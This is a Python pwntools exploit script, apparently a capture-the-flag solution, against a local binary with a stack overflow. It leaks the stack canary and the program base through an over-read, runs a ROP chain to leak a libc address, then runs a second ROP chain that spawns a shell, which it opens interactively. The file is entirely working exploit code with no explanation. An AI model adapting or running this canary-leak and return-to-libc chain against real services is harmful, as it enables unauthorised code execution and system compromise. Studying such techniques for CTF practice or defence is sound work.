from pwn import *
from struct import pack
import argparse
from setup import setup, u32Var, u64Var
from typing import List, Dict, Tuple
from time import sleep
import requests
import base64
import ctypes

breakpoints = '''
#pie 0xB95
pie 0xBC7
'''

extras = '''
set follow-fork-mode child
continue
'''

io, pid, elf, libc, ld = setup(None, breakpoints, extraGdbSettings=extras)

def sendRecv(buffer: bytes):
    io.recvuntil('buffer: ')
    io.send(buffer)
    io.recvuntil('output: ')
    return io.recvline()[:-1]

def exit():
    io.recvuntil('buffer: ')
    io.sendline('')
    
birdy = u64(sendRecv(b"A"*0x49 + b'\n')[0x48:0x50]) & 0xffffffffffffff00
log.info('canry: ' + hex(birdy))

base = u64Var(sendRecv(b'B'*0x50 + b'\n')[0x50:]) - 0xbd0
log.info('base: ' + hex(base))


rop  = b'A'*0x48 
rop += p64(birdy) 
rop += p64(base + 0x202000 + 0xa00) 
rop += p64(base + 0xc33)
rop += p64(base + 0x201fb0)
rop += p64(base + 0x750)
rop += p64(base + 0xA59)
rop += b'\n'

sendRecv(rop)

exit()

libc = u64Var(io.recvuntil(b'\npwny', drop=True)) - 0x58b20
log.info('libc: ' + hex(libc))

popRsi = 0x0000000000029d8f # pop rsi; ret;
popRdxRbx = 0x000000000013a4c6 # pop rdx; pop rbx; ret;

rop  = b'A'*0x48 
rop += p64(birdy) 
rop += p64(base + 0x202000 + 0xa00) 
rop += p64(base + 0xc33)
rop += p64(libc + 0x18de78)
rop += p64(libc + popRsi)
rop += p64(0x0)
rop += p64(libc + popRdxRbx)
rop += p64(0x0)
rop += p64(0xdeadbee4)
rop += p64(libc + 0xcd3e0)
rop += b'\n'

sendRecv(rop)

exit()

io.interactive()
